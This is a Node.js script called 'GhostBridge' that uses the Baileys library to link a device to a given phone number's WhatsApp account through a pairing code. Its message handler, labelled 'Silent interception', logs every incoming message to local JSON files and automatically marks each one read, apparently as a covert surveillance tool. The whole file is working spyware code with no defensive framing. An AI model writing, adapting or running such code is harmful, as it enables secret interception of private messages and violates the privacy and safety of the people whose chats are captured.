const { makeWASocket, useMultiFileAuthState, DisconnectReason, Browsers } = require('@whiskeysockets/baileys');
const readline = require('readline');
const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
const fs = require('fs');
const path = require('path');

const NUMBER = process.argv[2];
if (!NUMBER) {
  console.error('[GhostBridge] Usage: node ghost_bridge.cjs <phone_without_+>');
  process.exit(1);
}

const LOG_DIR = path.join(__dirname, '..', 'logs');
const AUTH_DIR = path.join(__dirname, '..', 'ghost_auth');
if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR, { recursive: true });

let pairingCode = null;
let linkSuccessLogged = false;

async function start() {
  const { state, saveCreds } = await useMultiFileAuthState(AUTH_DIR);
  const sock = makeWASocket({
    auth: state,
    browser: Browsers.macOS('Chrome'), // Correct browser config for pairing code
    printQRInTerminal: false,
    markOnlineOnConnect: true,
  });

  sock.ev.on('creds.update', saveCreds);

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr } = update;

    if ((connection === 'connecting' || !!qr) && !pairingCode) {
      console.log('[GhostBridge] Requesting pairing code...');
      try {
        pairingCode = await sock.requestPairingCode(NUMBER);
        console.log(`[GhostBridge] ╔══════════════════════════════════════╗`);
        console.log(`[GhostBridge] ║   PAIRING CODE: ${pairingCode}`);
        console.log(`[GhostBridge] ║   Enter in WhatsApp → Linked Devices → Link with Phone Number`);
        console.log(`[GhostBridge] ╚══════════════════════════════════════╝`);
        fs.writeFileSync(path.join(LOG_DIR, 'pairing_code.txt'), pairingCode);
      } catch (err) {
        console.error(`[GhostBridge] Pairing code request failed: ${err.message}`);
      }
    }

    if (connection === 'open') {
      console.log('[GhostBridge] ✅ WhatsApp session OPENED!');
      if (!linkSuccessLogged) {
        fs.writeFileSync(
          path.join(LOG_DIR, `ghost_linked_${NUMBER}.json`),
          JSON.stringify({ timestamp: new Date().toISOString(), ghost_number: NUMBER, status: 'linked', pairing_code: pairingCode })
        );
        linkSuccessLogged = true;
      }
    }

    if (connection === 'close') {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
      console.log(`[GhostBridge] Connection closed (reason: ${statusCode}). Reconnect: ${shouldReconnect}`);
      if (shouldReconnect) setTimeout(start, 5000);
      else console.log('[GhostBridge] Logged out. Delete ghost_auth/ to restart.');
    }
  });

  // Silent interception
  sock.ev.on('messages.upsert', async (msg) => {
    const logFile = path.join(LOG_DIR, `ghost_messages_${NUMBER}.json`);
    let existing = [];
    try { existing = JSON.parse(fs.readFileSync(logFile, 'utf8')); } catch (_) {}
    existing.push({ timestamp: new Date().toISOString(), message: msg });
    fs.writeFileSync(logFile, JSON.stringify(existing, null, 2));
    for (const m of msg.messages) {
      if (m.key) await sock.readMessages([m.key]).catch(() => {});
    }
  });
}

start().catch(err => { console.error('[GhostBridge] Fatal:', err.message); process.exit(1); });
